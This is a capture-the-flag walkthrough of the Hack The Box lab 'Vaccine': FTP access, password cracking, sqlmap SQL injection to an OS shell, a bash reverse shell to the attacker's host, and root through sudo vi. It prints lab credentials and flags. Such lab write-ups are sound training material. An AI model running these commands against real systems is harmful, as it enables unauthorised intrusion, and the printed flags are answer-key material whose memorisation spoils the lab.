# Vaccine
* Source: [Hack the Box](https://hackthebox.com/)
* Challenge: Vaccine
* Topic: FTP, SQL, SUID
* Difficulty: Very easy
* Date: 14-04-2022
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Tasks
1. Besides SSH and HTTP, what other service is hosted on this box?
 - **ftp**
2. This service can be configured to allow login with any password for specific username. What is that username?
- **anonymous**
3. What is the name of the file downloaded over this service?
- **backup.zip**
4. What script comes with the John The Ripper toolset and generates a hash from a password protected zip archive in a format to allow for cracking attempts?
- **zip2john**
5. What is the password for the admin user on the website?
- **qwerty789**
6. What option can be passed to sqlmap to try to get command execution via the sql injection?
- **--os-shell**
7. What program can the postgres user run as root using sudo?
- **vi**
8. Submit user flag?
- **ec9b13ca4d6229cd5cc1e09980965bf7**

---
## Flag:
```console
┌──(kali㉿kali)-[~]
└─$ nmap -n -sC -sV 10.129.141.154
Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-14 06:20 EDT
Nmap scan report for 10.129.141.154
Host is up (0.071s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.15
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: MegaCorp Login
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.46 seconds
```

FTP get:

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ ftp 10.129.141.154
Connected to 10.129.141.154.
220 (vsFTPd 3.0.3)
Name (10.129.141.154:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> pwd
Remote directory: /
ftp> ls
229 Entering Extended Passive Mode (|||10554|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.
ftp> get backup.zip
local: backup.zip remote: backup.zip
229 Entering Extended Passive Mode (|||10226|)
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
100% |*************************************|  2533       29.45 MiB/s    00:00 ETA
226 Transfer complete.
2533 bytes received in 00:00 (35.43 KiB/s)
ftp> exit
221 Goodbye.
       
┌──(kali㉿kali)-[~/Downloads]
└─$ ls
backup.zip
       
┌──(kali㉿kali)-[~/Downloads]
└─$ unzip backup.zip 
Archive:  backup.zip
[backup.zip] index.php password: 
   skipping: index.php               incorrect password
   skipping: style.css               incorrect password
```

The .zip archive is password protected, we can use 'john' to crack it. 

We need to create a hash based on the zip file for 'john' to work with.

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ zip2john backup.zip > hash
ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06 ts=5722 cs=5722 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A ts=989A cs=989a type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
 
┌──(kali㉿kali)-[~/Downloads]
└─$ ls
backup.zip  hash

┌──(kali㉿kali)-[~/Downloads]
└─$ john -w=/usr/share/seclists/Passwords/xato-net-10-million-passwords.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)     
1g 0:00:00:00 DONE (2022-04-14 09:10) 100.0g/s 819200p/s 819200c/s 819200C/s 123456..leeds
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(kali㉿kali)-[~/Downloads]
└─$ unzip backup.zip
Archive:  backup.zip
[backup.zip] index.php password: 
  inflating: index.php               
  inflating: style.css               
 
┌──(kali㉿kali)-[~/Downloads]
└─$ ls
backup.zip  hash  index.php  style.css

┌──(kali㉿kali)-[~/Downloads]
└─$ cat index.php 
<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>
(...)
```

We got the password and unzipped the archive! In index.php, we find some admin credentials.

Username: `admin`

MD5 password hash: `2cb42f8734ea607eefed3b70af13bbd3`

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ hashid 2cb42f8734ea607eefed3b70af13bbd3
Analyzing '2cb42f8734ea607eefed3b70af13bbd3'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 
```

It's probably MD5 since it also says that in the .php file.

Let's try and crack it!

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ echo '2cb42f8734ea607eefed3b70af13bbd3' > md5hash

┌──(kali㉿kali)-[~/Downloads]
└─$ john --format=raw-md5 -w=/usr/share/seclists/Passwords/xato-net-10-million-passwords.txt md5hash
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
qwerty789        (?)     
1g 0:00:00:00 DONE (2022-04-14 09:29) 100.0g/s 5222Kp/s 5222Kc/s 5222KC/s shafted..polkaudi
Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
Session completed.
```

Awesome, we cracked the password:

user:pass `admin:qwerty789`

Now we can log in via the web portal:

![](./attachments/Pasted%20image%2020220414161753.png)

We are in! Time to get a foothold.

The page appears to be static except for a search field. Let's input a random query and test it. 

![](./attachments/Pasted%20image%2020220414162644.png)

It appears the URL may be vulnerable to injections.

We can use 'SQLmap' to automate the process. Though, we need to provide it with our cookie in order for it to work. We can inspect the page and get it manually, or we can use a nice browser extension called [Cookie-Editor](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/) to speed things up a bit.

![](./attachments/Pasted%20image%2020220414164914.png)

The cookies in the HTTP request is usually set like this:

`PHPSESSID=d650eoacf59r8mgcf2t1t8dgmc`

Knowing this, we can construct and execute our 'SQLmap' command.

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ sqlmap -u 'http://10.129.102.117/dashboard.php?search=haxxx' --cookie="PHPSESSID=d650eoacf59r8mgcf2t1t8dgmc"
        ___
       __H__                                                                                                                                                          
 ___ ___[.]_____ ___ ___  {1.6.4#stable}                                                                                                                              
|_ -| . ["]     | .'| . |                                                                                                                                             
|___|_  [.]_|_|_|__,|  _|                                                                                                                                             
      |_|V...       |_|   https://sqlmap.org                                                                                                                          

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:55:40 /2022-04-14/

[10:55:41] [INFO] testing connection to the target URL
[10:55:41] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:55:41] [INFO] testing if the target URL content is stable

(...) 

[10:56:32] [INFO] GET parameter 'search' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable
[10:56:32] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
```

We have now confirmed that the URL is vulnerable to SQL injection.

We can try and exploit it by adding `--os-shell` as a flag.

```console
┌──(kali㉿kali)-[~/Downloads]
└─$ sqlmap -u 'http://10.129.102.117/dashboard.php?search=haxxx' --cookie="PHPSESSID=d650eoacf59r8mgcf2t1t8dgmc" --os-shell
        ___
       __H__                                                                                                                                                          
 ___ ___[.]_____ ___ ___  {1.6.4#stable}                                                                                                                              
|_ -| . [.]     | .'| . |                                                                                                                                             
|___|_  [,]_|_|_|__,|  _|                                                                                                                                             
      |_|V...       |_|   https://sqlmap.org                                                                                                                          

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:05:16 /2022-04-14/

[11:05:16] [INFO] resuming back-end DBMS 'postgresql' 
[11:05:16] [INFO] testing connection to the target URL

(...)

[11:05:17] [INFO] the back-end DBMS is PostgreSQL
web server operating system: Linux Ubuntu 20.10 or 19.10 or 20.04 (eoan or focal)
web application technology: Apache 2.4.41
back-end DBMS: PostgreSQL
[11:05:17] [INFO] fingerprinting the back-end DBMS operating system
[11:05:17] [INFO] the back-end DBMS operating system is Linux
[11:05:17] [INFO] testing if current user is DBA
[11:05:18] [INFO] retrieved: '1'
[11:05:18] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution
[11:05:18] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER
os-shell> 
```

We got a shell! To make it more stable, we will try to establish a new connection via netcat.

In order to do that, we execute a final command after setting up netcat on port 1234.

`bash -c "bash -i >& /dev/tcp/10.10.14.15/1234 0>&1"`

```console
┌──(kali㉿kali)-[~]
└─$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.15] from (UNKNOWN) [10.129.102.117] 48120
bash: cannot set terminal process group (4144): Inappropriate ioctl for device
bash: no job control in this shell
postgres@vaccine:/var/lib/postgresql/11/main$ whoami
postgres
postgres@vaccine:/var/lib/postgresql/11/main$ pwd
/var/lib/postgresql/11/main
```

Successfully connected via netcat.

Looking around:

```console
postgres@vaccine:/var/lib/postgresql/11/main$ cd /var/www/html
cd /var/www/html
postgres@vaccine:/var/www/html$ ls -lah
ls -lah
total 392K
drwxr-xr-x 2 root root 4.0K Jul 23  2021 .
drwxr-xr-x 3 root root 4.0K Jul 23  2021 ..
-rw-rw-r-- 1 root root 355K Feb  3  2020 bg.png
-rw-r--r-- 1 root root 4.7K Feb  3  2020 dashboard.css
-rw-r--r-- 1 root root   50 Jan 30  2020 dashboard.js
-rw-r--r-- 1 root root 2.3K Feb  4  2020 dashboard.php
-rw-r--r-- 1 root root 2.6K Feb  3  2020 index.php
-rw-r--r-- 1 root root 1.1K Jan 30  2020 license.txt
-rw-r--r-- 1 root root 3.2K Feb  3  2020 style.css
postgres@vaccine:/var/www/html$ cat dashboard.php

(...)

<tbody>
        <?php
        session_start();
        if($_SESSION['login'] !== "true") {
          header("Location: index.php");
          die();
        }
        try {
          $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
        }

        catch ( exception $e ) {
          echo $e->getMessage();
        }

(...)
```

A password and username, we can use it to log in via ssh. The shell is constantly dying, so that would be really nice.

User:pass `postgres:P@s5w0rd!`


```
┌──(kali㉿kali)-[~]
└─$ ssh postgres@10.129.28.101
The authenticity of host '10.129.28.101 (10.129.28.101)' can't be established.
ED25519 key fingerprint is SHA256:4qLpMBLGtEbuHObR8YU15AGlIlpd0dsdiGh/pkeZYFo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.28.101' (ED25519) to the list of known hosts.
postgres@10.129.28.101's password: 
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-64-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 14 Apr 2022 04:48:18 PM UTC

  System load:  0.0               Processes:             185
  Usage of /:   32.6% of 8.73GB   Users logged in:       0
  Memory usage: 19%               IP address for ens160: 10.129.28.101
  Swap usage:   0%


0 updates can be installed immediately.
0 of these updates are security updates.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

postgres@vaccine:~$ ls
11  user.txt
postgres@vaccine:~$ cat user.txt 
ec9b13ca4d6229cd5cc1e09980965bf7
postgres@vaccine:~$ 
```

And the user flag is right there.

User flag: `ec9b13ca4d6229cd5cc1e09980965bf7`

```console
postgres@vaccine:~$ sudo -l
[sudo] password for postgres: 
Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Ok, we have access to 'vi' as superuser.

```console
postgres@vaccine:~$ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
[sudo] password for postgres:
# PostgreSQL Client Authentication Configuration File
# ===================================================
#
# Refer to the "Client Authentication" section in the PostgreSQL
# documentation for a complete description of this file.  A short
# synopsis follows.
#
# This file controls: which hosts are allowed to connect, how clients
# are authenticated, which PostgreSQL user names they can use, which
# databases they can access.  Records take one of these forms:
#
# local      DATABASE  USER  METHOD  [OPTIONS]
# host       DATABASE  USER  ADDRESS  METHOD  [OPTIONS]
# hostssl    DATABASE  USER  ADDRESS  METHOD  [OPTIONS]
# hostnossl  DATABASE  USER  ADDRESS  METHOD  [OPTIONS]
#
# (The uppercase items must be replaced by actual values.)
#
# The first field is the connection type: "local" is a Unix-domain
# socket, "host" is either a plain or SSL-encrypted TCP/IP socket,
# "hostssl" is an SSL-encrypted TCP/IP socket, and "hostnossl" is a
# plain TCP/IP socket.
#
# DATABASE can be "all", "sameuser", "samerole", "replication", a
# database name, or a comma-separated list thereof. The "all"
# keyword does not match "replication". Access to replication
# must be enabled in a separate record (see example below).
#
:set shell=/bin/sh
:shell

# whoami
root
# pwd
/var/lib/postgresql
# cd /root
# ls
pg_hba.conf  root.txt  snap
# cat root.txt  
dd6e058e814260bc70e9bbdef2715849
```

We got root and found the flag!

**Flag:** `dd6e058e814260bc70e9bbdef2715849`

---
**Tags:** [[HackTheBox]]